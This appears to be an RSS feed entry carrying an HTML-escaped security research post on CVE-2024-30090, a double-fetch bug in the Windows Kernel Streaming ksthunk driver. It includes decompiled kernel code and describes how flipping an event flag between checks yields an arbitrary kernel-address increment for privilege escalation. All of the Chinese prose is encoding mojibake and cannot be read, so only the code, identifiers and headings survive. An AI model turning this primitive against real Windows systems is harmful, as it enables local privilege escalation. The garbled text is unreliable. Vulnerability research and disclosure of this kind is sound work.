                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÊòØ‰∏ÄÁ≥ªÂàóÊúâÈóú Kernel Streaming ÁöÑÁõ∏ÈóúÁöÑÊºèÊ¥ûÁ†îÁ©∂ÔºåÂª∫Ë≠∞ÂÖàÈñ±ËÆÄ‰ª•‰∏ãÊñáÁ´†&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/&quot;&gt;Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Âú®ÂÖàÂâç Proxying to Kernel ÁöÑÁ†îÁ©∂‰∏≠ÔºåÊàëÂÄëÂú® Kernel Streaming ‰∏≠ÊâæÂà∞‰∫ÜÂ§öÂÄãÊºèÊ¥û‰ª•Âèä‰∏ÄÂÄãË¢´ÂøΩË¶ñÁöÑ Bug ClassÔºå‰∏¶Âú®‰ªäÂπ¥ Pwn2Own Vancouver 2024 ‰∏≠Âà©Áî®ÊºèÊ¥û &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#cve-2024-35250&quot;&gt;CVE-2024-35250&lt;/a&gt; Âèä &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#cve-2024-30084&quot;&gt;CVE-2024-30084&lt;/a&gt; ÊàêÂäüÊîª‰∏ã Windows 11„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÄåÂú®ÈÄôÁØáÁ†îÁ©∂‰∏≠ÔºåÊàëÂÄëÂ∞áÁπºÁ∫åÂª∂Á∫åÈÄôÂÄãÊîªÊìäÈù¢ÂíåÈÄôÂÄã Bug ClassÔºå‰πüÂ∞áÊè≠Èú≤Âè¶Â§ñ‰∏ÄÂÄãÊºèÊ¥ûÂíåÂà©Áî®ÊâãÊ≥ïÔºå‰∫¶ÁôºË°®Êñº &lt;a href=&quot;https://www.hexacon.fr/conference/speakers/&quot;&gt;HEXACON 2024&lt;/a&gt; ‰∏≠„ÄÇ&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Âú® Pwn2Own Vancouver 2024 ‰πãÂæåÔºåÊàëÂÄëÁπºÁ∫åÈáùÂ∞ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; ÈÄôÂÄã bug pattern ÂéªÁúãÁúãÊúâÊ≤íÊúâÂÖ∂‰ªñÂÆâÂÖ®ÊÄß‰∏äÁöÑÂïèÈ°åÔºåÁÑ∂ËÄåÊâæ‰∫Ü‰∏ÄÊÆµÊôÇÈñìÂæåÔºåÈáùÂ∞ç KS Object ÁöÑ Property Êìç‰Ωú‰∏≠Ôºå‰∏¶Ê≤íÊúâÊâæÂà∞ÂÖ∂‰ªñÂèØ‰ª•Âà©Áî®ÁöÑÈªûÔºåÂõ†ËÄåÊàëÂÄëÂ∞áÊñπÂêëËΩâÂæÄÂè¶Â§ñ‰∏ÄÂÄãÂäüËÉΩ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-events&quot;&gt;KS Event&lt;/a&gt; ‰∏ä„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;ks-event&quot;&gt;KS Event&lt;/h2&gt;
&lt;p&gt;KS Event ËàáÂâç‰∏ÄÁØáÊèêÂà∞ÁöÑ KS Property È°û‰ºº„ÄÇKS Object ‰∏≠Èô§‰∫ÜÊúâËá™Â∑±ÁöÑ Property Set ‰πãÂ§ñÔºå‰πüÊúâÊèê‰æõË®≠ÂÆö KS Event ÁöÑÂäüËÉΩÔºåÊØîÂ¶ÇË™™‰Ω†ÂèØ‰ª•Ë®≠ÂÆöË®≠ÂÇôÁãÄÊÖãÊîπËÆäÊàñÊòØÊØèÂÄã‰∏ÄÊÆµÊôÇÈñìÂ∞±Ëß∏Áôº EventÔºåÊñπ‰æøÊí≠ÊîæËªüÈ´îÁ≠âÈñãÁôºËÄÖÂÆöÁæ©ÂæåÁ∫åÁöÑË°åÁÇ∫ÔºåËÄåÊØèÂÄã KS Event Â∞±Â¶ÇÂêå Property ‰∏ÄÊ®£ÔºåË¶Å‰ΩøÁî®Â∞±ÂøÖÈ†àË©≤ KS Object ÊúâÊîØÊè¥„ÄÇÊàëÂÄëÂèØ‰ª•ÈÄèÈÅé &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_enable_event&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/a&gt;  Âèä &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_disable_event&quot;&gt;IOCTL_KS_DISABLE_EVENT&lt;/a&gt; ‰æÜË®ªÂÜäÊàñÈóúÈñâÈÄô‰∫õ Event„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;kseventdata&quot;&gt;KSEVENTDATA&lt;/h3&gt;
&lt;p&gt;ËÄåÂú®Ë®ªÂÜä KS Event ÊôÇÔºå‰Ω†ÂèØ‰ª•ËóâÁî±Êèê‰æõ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-kseventdata&quot;&gt;KSEVENTDATA&lt;/a&gt; ‰æÜË®ªÂÜä‰Ω†ÊÉ≥Ë¶ÅÁöÑ‰∫ã‰ª∂ÔºåÂÖ∂‰∏≠ÂèØ‰ª•Êèê‰æõ EVENT_HANDLE Âèä SEMAPHORE_HANDLE Á≠â handle ‰æÜË®ªÂÜäÔºåÁï∂ KS Ëß∏ÁôºÈÄôÂÄã‰∫ã‰ª∂ÊôÇÔºåÂ∞±ÊúÉËóâÁî±ÈÄôÂÄã handle ‰æÜÈÄöÁü•‰Ω†„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_enable_event&quot;&gt;The work flow of IOCTL_KS_ENABLE_EVENT&lt;/h3&gt;
&lt;p&gt;ÂÖ∂Êï¥ÂÄãÈÅã‰ΩúÊµÅÁ®ã‰πüËàá IOCTL_KS_PROPERTY Èõ∑ÂêåÔºåÂú®ÂëºÂè´ DeviceIoControl ÊôÇÔºåÂ∞±ÊúÉÂÉè‰∏ãÂúñ‰∏ÄÊ®£ÔºåÂ∞á‰ΩøÁî®ËÄÖÁöÑ requests ‰æùÂ∫èÁµ¶Áõ∏Â∞çÊáâÁöÑ driver ‰æÜËôïÁêÜ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂêåÊ®£ÊúÉÂú®Á¨¨ 3 Ê≠•ÊôÇÂÅö 32-bit ÁöÑ requests ËΩâÊèõÊàê 64-bit ÁöÑ requests„ÄÇÂà∞Á¨¨ 6 Ê≠•ÊôÇ ks.sys Â∞±ÊúÉÊ†πÊìö‰Ω† requests ÁöÑ Event ‰æÜÊ±∫ÂÆöË¶Å‰∫§Áµ¶Âì™ÂÄã driver Âèä &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/nc-ks-pfnksaddevent&quot;&gt;addhandler&lt;/a&gt; ‰æÜËôïÁêÜ‰Ω†ÁöÑ request„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊúÄÁµÇÂÜçËΩâÁôºÁµ¶Áõ∏Â∞çÊáâÁöÑ Driver„ÄÇÂ¶Ç‰∏äÂúñ‰∏≠ÊúÄÂæåËΩâÁôºÁµ¶ ks ‰∏≠ÁöÑ KsiDefaultClockAddMarkEvent ‰æÜ&lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-kesettimerex&quot;&gt;Ë®≠ÁΩÆ Timer&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú®‰∫ÜËß£‰∫Ü KS Event ÂäüËÉΩÂèäÊµÅÁ®ãÂæåÔºåÊ†πÊìö‰πãÂâçÁöÑ &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#the-new-bug-pattern&quot;&gt;bug pattern&lt;/a&gt; ÂæàÂø´Âú∞ÂèàÊâæÂà∞‰∫Ü‰∏ÄÂÄãÂèØ‰ª•Âà©Áî®ÁöÑÊºèÊ¥û &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-30090&quot;&gt;CVE-2024-30090&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;proxying-to-kernel-again-&quot;&gt;Proxying to kernel again !&lt;/h2&gt;
&lt;p&gt;ÈÄôÊ¨°ÁöÑÂïèÈ°åÈªûÁôºÁîüÂú® ksthunk Â∞á 32-bit request ËΩâÊèõÊàê 64-bit request ÁöÑÈÅéÁ®ã„ÄÇ&lt;/p&gt;

&lt;p&gt;Â¶Ç‰∏ãÂúñÔºåÁï∂ ksthunk Êé•Êî∂Âà∞‰æÜËá™ WoW64 Process ÁöÑ IOCTL_KS_ENABLE_EVENT ÊôÇÔºåÊúÉÈÄ≤Ë°å 32-bit ÁµêÊßãÂà∞ 64-bit ÁµêÊßãÁöÑËΩâÊèõ
&lt;img src=&quot;/assets/img/blog/20241005/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËΩâÊèõÈÅéÁ®ãÊúÉÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; ‰æÜËôïÁêÜ&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) 
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28);  //------------------------[1]
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
            &amp;amp;BytesReturned);  //-----------------[2]
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ËÄåÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; ‰∏≠ÔºåÊòéÈ°ØÂèØ‰ª•ÁúãÂà∞È°û‰ººÁöÑ bug patternÔºåÂæû [1] ‰∏≠ÂèØ‰ª•ÁúãÂà∞ÔºåÂÆÉÊúÉË§áË£Ω‰ΩøÁî®ËÄÖÁöÑËº∏ÂÖ•Âà∞Êñ∞ÂàÜÈÖçÂá∫‰æÜÁöÑ Buffer ‰∏≠ÔºåÊé•ËëóÂú® [2] ËôïÔºåÂ∞±ÊúÉÂà©Áî®Ë©≤ Buffer ‰æÜ‰ΩøÁî® KsSynchronousIoControlDevice ÂëºÂè´Êñ∞ÁöÑ IOCTLÔºå„ÄÇÂÖ∂‰∏≠ newinputbuf Âèä OutBuffer ÈÉΩÊòØ‰ΩøÁî®ËÄÖÊâÄÂÇ≥ÂÖ•ÁöÑÂÖßÂÆπ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; ÊôÇÁöÑÊµÅÁ®ãÔºåÂ§ßÊ¶ÇÂ¶Ç‰∏ãÂúñÊâÄÁ§∫ :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® WoW64 ÁöÑÁ®ãÂºè‰∏≠ÂëºÂè´ IOCTL ÊôÇÔºåÂèØ‰ª•ÁúãÂà∞Âúñ‰∏≠Á¨¨ 2 Ê≠• I/O Manager ÊúÉÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; Ë®≠Êàê UserMode(1)ÔºåËÄåÂú®Á¨¨ 3 Ê≠•ÊôÇÔºåksthunk ÊúÉÂ∞á‰ΩøÁî®ËÄÖÁöÑ request Âæû 32-bit ËΩâÊèõÊàê 64-bitÔºåÈÄôÈÇäÂ∞±ÊúÉÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; ‰æÜËôïÁêÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰πãÂæåÁ¨¨ 5 Ê≠•ÔºåÂ∞±ÊúÉÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; ÈáçÊñ∞ÂëºÂè´ IOCTL ÔºåËÄåÊ≠§ÊôÇÊñ∞ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; Â∞±ËÆäÊàê‰∫Ü KernelMode(0) ‰∫ÜÔºåËÄåÂæåÁ∫åÁöÑËôïÁêÜÂ∞±Â¶Ç‰∏ÄËà¨ÁöÑ IOCTL_KS_ENABLE_EVENT Áõ∏ÂêåÔºåÂ∞±‰∏çÂè¶Â§ñË©≥Ëø∞‰∫ÜÔºåÁ∏Ω‰πãÊàëÂÄëÂà∞ÈÄôË£°Â∑≤Á∂ìÊúâÂÄãÂèØ‰ª•‰ªªÊÑèÂÅö IOCTL_KS_ENABLE_EVENT ÁöÑ primitive ‰∫ÜÔºåÊé•‰∏ã‰æÜÊàëÂÄëÂøÖÈ†àÂ∞ãÊâæÁúãÁúãÊòØÂê¶ÊúâÂèØ‰ª• EoP ÁöÑÂú∞Êñπ„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;the-exploitation&quot;&gt;The Exploitation&lt;/h2&gt;
&lt;p&gt;Ë∑üÂÖàÂâçÊÄùË∑Ø‰∏ÄÊ®£Ôºå‰∏ÄÈñãÂßãÈÇÑÊòØÊúÉÂÖàÂàÜÊûêÂÖ•Âè£Èªû ksthunkÔºåÁÑ∂ËÄåÊàëÂÄëÊâæÂ∞ã‰∫Ü‰∏ÄÈô£Â≠ê‰πãÂæåÔºå‰∏¶Ê≤íÊúâÁúãÂà∞ÂèØ‰ª•ÂÅöÁÇ∫ÊèêÊ¨äÁöÑÂú∞ÊñπÔºåËÄå‰∏îÂú® ksthunk ‰∏≠ÔºåÂ§ßÂ§öÊï∏Âè™Ë¶ÅÁúãÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestMode&lt;/code&gt; ÊòØ KernelMode(0) Â∞±ÊúÉÁõ¥Êé•ÂæÄ‰∏ãÂÇ≥ÈÅûËÄå‰∏çÂè¶Â§ñÂÅöËôïÁêÜ„ÄÇÂõ†Ê≠§ÊàëÂÄëÂ∞áÊàëÂÄëÁöÑÁõÆÊ®ôËΩâÂêë‰ΩçÂú®‰∏ã‰∏ÄÂ±§ÁöÑ ksÔºåÁúãÁúãÂÆÉÂú®ËôïÁêÜ event ÁöÑÈÅéÁ®ã‰∏≠ÔºåÊòØÂê¶ÊúâÂèØ‰ª•Áî®‰æÜÊèêÊ¨äÁöÑÂú∞Êñπ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂæàÂø´ÁöÑÂ∞±ÊâæÂà∞‰∏ÄÂÄãÂê∏ÂºïÊàëÂÄëÁõÆÂÖâÁöÑÂú∞ÊñπÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® KspEnableEvent ÁöÑ Handler ‰∏≠ÔºåÊúâ‰∏ÄËôïÊúÉÂÖàÂà§Êñ∑‰Ω†ÊâÄÂÇ≥ÂÖ•ÁöÑ KSEVENTDATA ‰∏≠ÁöÑ NotificationType ‰æÜÊ±∫ÂÆöË¶ÅÊÄéÈ∫ºË®ªÂÜäÂèäËôïÁêÜ‰Ω†ÁöÑ‰∫ã‰ª∂ÔºåÂú®‰∏ÄËà¨ÊÉÖÊ≥Å‰∏ãÈÄöÂ∏∏ÊòØÁµ¶‰∏ÄÂÄã &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventa&quot;&gt;EVENT_HANDLE&lt;/a&gt; ÊàñÊòØ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createsemaphorea&quot;&gt;SEMAPHORE_HANDLE&lt;/a&gt;ÔºåÁÑ∂ËÄåÂú® ks ‰∏≠ÔºåÂ¶ÇÊûúÊòØÂæû KernelMode ÂëºÂè´ÁöÑÂ∞±Áµ¶‰ª•Êèê‰æõ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/event-objects&quot;&gt;Event Object&lt;/a&gt; ÁîöËá≥ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-dpc-objects&quot;&gt;DPC&lt;/a&gt; ‰æÜË®ªÂÜä‰Ω†ÁöÑ‰∫ã‰ª∂ÔºåËÆìÊï¥È´îÁöÑËôïÁêÜ‰∏äÊõ¥ÊúâÊïàÁéá„ÄÇ&lt;/p&gt;

&lt;p&gt;‰πüÂ∞±ÊòØË™™ÊàëÂÄëÂèØ‰ª•ËóâÁî±ÈÄôÂÄã KernelMode ÁöÑ DeviceIoControl ÁöÑ primitive ‰æÜÊèê‰æõ‰ªªÊÑè Kernel ObjectÔºåËÆìÂÆÉÂÅöÂæåÁ∫åËôïÁêÜÔºåÊßãÈÄ†ÁöÑÂ•ΩÂ∞±ÊúâÊ©üÊúÉÈÅîÊàê EoP ‰ΩÜË¶ÅÁúãÂæåÁ∫åÊÄéÈ∫º‰ΩøÁî®ÈÄôÂÄã Object Â∞±ÊòØ‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩÜÊòØÊàëÂÄëÂú®ÂòóË©¶‰∫Ü‰∏ÄÊÆµÊôÇÈñìÂæåÁôºÁèæÂà∞‚Ä¶‚Ä¶&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  //-------[3]
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) //-------[4]
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28); //------[5] 
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
            &amp;amp;BytesReturned);  
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Â¶ÇÊûúË¶ÅÊèê‰æõ‰ªªÊÑè Kernel Object ÂéªË®ªÂÜä‰∫ã‰ª∂ÔºåÈÇ£È∫º IOCTL ‰∏≠ÊâÄÁµ¶ÂÆöÁöÑ &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksevent-structure&quot;&gt;KSEVENT&lt;/a&gt; ÁöÑ flagÔºåÂøÖÈ†àË¶ÅÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt;Ôºå‰πüÂ∞±ÊòØ‰∏äÈù¢Á®ãÂºèÁ¢º [3] ÁöÑÈÉ®ÂàÜÔºåÁÑ∂ËÄåÂú®Á®ãÂºèÁ¢ºÁâáÊÆµ [4] ËôïÊòØËß∏ÁôºÊºèÊ¥ûÁöÑÂú∞ÊñπÂçªÊòØË¶ÅÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;Ôºå‰∏¶Ê≤íËæ¶Ê≥ïÂ¶ÇÊàëÂÄëÊâÄÊÉ≥ÁöÑ‰∏ÄÊ®£Áõ¥Êé•Áµ¶‰∏ÄÂÄã Kernel Object„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄåÂπ∏ÈÅãÁöÑÊòØÊï¥ÂÄã IOCTL_KS_ENABLE_EVENT ‰πüÊòØ‰ΩøÁî® &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o&quot;&gt;Neither I/O&lt;/a&gt; Áõ¥Êé•Êãø‰ΩøÁî®ËÄÖÁöÑ Input buffer ‰æÜÂÅöË≥áÊñô‰∏äÁöÑËôïÁêÜÔºå&lt;strong&gt;ÂÜçÊ¨°&lt;/strong&gt;Âá∫Áèæ‰∫Ü Double Fetch ÁöÑÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Â¶Ç‰∏äÂúñ‰∏≠ÊâÄÁ§∫ÔºåÊàëÂÄëÂèØ‰ª•Âú®ÂëºÂè´ IOCTL ÂâçÊää flag Ë®≠ÁΩÆÊàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;ÔºåÊ™¢Êü•ÊôÇÂ∞±ÊúÉ‰ª• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt; ÁöÑÂäüËÉΩËôïÁêÜÔºåËÄåÂú®Á¨¨‰∫åÊ¨°ÂëºÂè´ IOCTL ÂâçÔºåÂ∞±Êää flag ÊèõÊàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt;ÔºåÈÄôÊ®£Â∞±ÂèØ‰ª•ÊàêÂäüËß∏ÁôºÊºèÊ¥û‰∏¶ÊßãÈÄ†ÁâπÂÆöÁöÑ Kernel Object ‰æÜË®ªÂÜä‰∫ã‰ª∂‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;trigger-the-event&quot;&gt;Trigger the event&lt;/h3&gt;
&lt;p&gt;Ëá≥ÊñºÁîöÈ∫ºÊôÇÂÄôÊúÉÁî®Âà∞‰Ω†ÊâÄÊßãÈÄ†ÁöÑ KS Object Âë¢? Áï∂‰∫ã‰ª∂Ëß∏ÁôºÊôÇÔºå ks ÊúÉÈÄèÈÅé DPC ÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!ksGenerateEvent&lt;/code&gt;ÔºåÊ≠§ÊôÇÂ∞±ÊúÉ‰æùÁÖß‰Ω†ÊâÄÁµ¶ÂÆöÁöÑ NotificationType ‰æÜÊ±∫ÂÆöË¶ÅÊÄéÈ∫ºËôïÁêÜ‰Ω†ÁöÑ‰∫ã‰ª∂„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂ∞±‰æÜÁúã‰∏Ä‰∏ã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsGenerateEvent&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;NTSTATUS __stdcall KsGenerateEvent(PKSEVENT_ENTRY EventEntry)
{

  switch ( EventEntry-&amp;gt;NotificationType )
  {
    case KSEVENTF_DPC:
      ...
      if ( !KeInsertQueueDpc(EventEntry-&amp;gt;EventData-&amp;gt;Dpc.Dpc, EventEntry-&amp;gt;EventData, 0LL) )
        _InterlockedAdd(&amp;amp;EventEntry-&amp;gt;EventData-&amp;gt;EventObject.Increment, 0xFFFFFFFF); //--------[6]
      ...
    case KSEVENTF_KSWORKITEM:
      ...
      KsIncrementCountedWorker(eventdata-&amp;gt;KsWorkItem.KsWorkerObject); //-----------[7]

  }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ÂÖ∂ÂØ¶Âà∞ÈÄôÈÇäÂ∞±ÊúâÂ§öÁ®ÆÂà©Áî®ÊñπÂºèÂèØ‰ª•Âà©Áî®ÔºåÊúÄÁõ¥Êé•ÁöÑËé´ÈÅéÊñºÁõ¥Êé•ÊßãÈÄ† DPC ÁµêÊßãË®ªÂÜä DPC ‰æÜÈÅîÊàê‰ªªÊÑè Kernel Á®ãÂºèÁ¢ºÂü∑Ë°åÔºå‰πüÂ∞±ÊòØ‰∏äÈù¢Á®ãÂºèÁ¢ºÁâáÊÆµ [6] ÁöÑÂú∞ÊñπÔºå&lt;strong&gt;‰ΩÜÂú®ÂëºÂè´ KsGenerateEvent ÊôÇÁöÑ IRQL ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DISPATCH_LEVEL&lt;/code&gt; ÂæàÈõ£Âú® User space ‰∏ãÊßãÈÄ† DPC object Âà©Áî®ÈÅéÁ®ã‰πüÊúÉÈÅáÂà∞Ë®±Â§öÂïèÈ°å&lt;/strong&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊâÄ‰ª•ÊàëÂÄëÊîπÁî®Âè¶Â§ñ‰∏ÄÊ¢ù KSEVENTF_KSWORKITEMÔºå‰πüÂ∞±ÊòØÁ®ãÂºèÁ¢ºÁâáÊÆµ [7] ÁöÑÈÉ®ÂàÜÔºåËóâÁî±ÂÇ≥ÂÖ• Kernel ‰ΩçÁΩÆÔºåËÆì‰ªñË™§Ë™çÁÇ∫ÊòØ KSWORKITEM ÁöÑÊåáÊ®ô„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂÖ∂‰∏≠Â∞±ÊúÉÂ∞çË©≤ÊåáÊ®ôÊåáÂêë‰ΩçÁΩÆÂä†‰∏ä 0x5c ÁöÑÂú∞ÊñπÂä†‰∏ÄÔºå‰πüÂ∞±ÊòØÂèØ‰ª•ÈÅîÂà∞‰ªªÊÑè Kerenl Address Âä†‰∏ÄÁöÑÂØ´ÂÖ•ÔºåÂÖ∂Êï¥ÂÄãÈÅéÁ®ãÂ∞±Â¶Ç‰∏ãÂúñÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

